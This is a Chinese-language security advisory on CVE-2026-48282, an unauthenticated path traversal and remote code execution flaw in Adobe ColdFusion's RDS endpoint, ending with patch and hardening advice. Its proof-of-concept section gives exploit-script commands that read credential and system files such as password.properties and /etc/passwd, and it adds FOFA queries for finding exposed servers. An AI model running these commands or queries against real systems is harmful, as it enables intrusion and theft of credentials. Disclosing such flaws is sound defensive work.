**文章来源为：AI agent 自动采集整理**

**严重程度：** Critical
**CVSS：** 10.0
**影响版本：** ColdFusion 2025 Update 9 及更早, ColdFusion 2023 Update 20 及更早
**公开日期：** 2026-07-06
**在野利用：** ✅ 已确认（披露后数小时内即被利用）

### 漏洞描述
Adobe ColdFusion 的 Remote Development Service (RDS) 存在路径穿越漏洞，通过 /CFIDE/main/ide.cfm 端点，未经认证的攻击者可读取和写入任意文件，最终实现远程代码执行。该漏洞与 CVE-2026-47928 等共7个 CVSS 10.0 漏洞同批次修补。加拿大网络安全中心 (CCCS) 已发出紧急警告。

### POC/利用
```python
# CVE-2026-48282 - Adobe ColdFusion RDS Path Traversal to RCE
# 漏洞端点: /CFIDE/main/ide.cfm
# 攻击向量: 路径穿越读取/写入任意文件

# 检查目标是否可利用:
python cve-2026-48282.py -t http://target.com --check

# 读取敏感文件:
python cve-2026-48282.py -t http://target.com --read "C:\\CFusionMX7\\lib\\password.properties"
python cve-2026-48282.py -t http://target.com --read "C:\\CFusionMX7\\lib\\neo-query.xml"
python cve-2026-48282.py -t https://target.com --read /etc/passwd

# 浏览目录:
python cve-2026-48282.py -t http://target.com --browse "C:\\"
```

### FOFA 指纹
`app:"Adobe ColdFusion"`
`body="/CFIDE/"`

### 修复建议
1. **紧急升级**: ColdFusion 2025 Update 10 或 ColdFusion 2023 Update 21
2. 限制 /CFIDE/ 路径的外部访问
3. 审计所有 ColdFusion 实例（含影子资产）
4. 检查是否已被植入 webshell
5. Adobe 自7月14日起改为每月两次安全公告
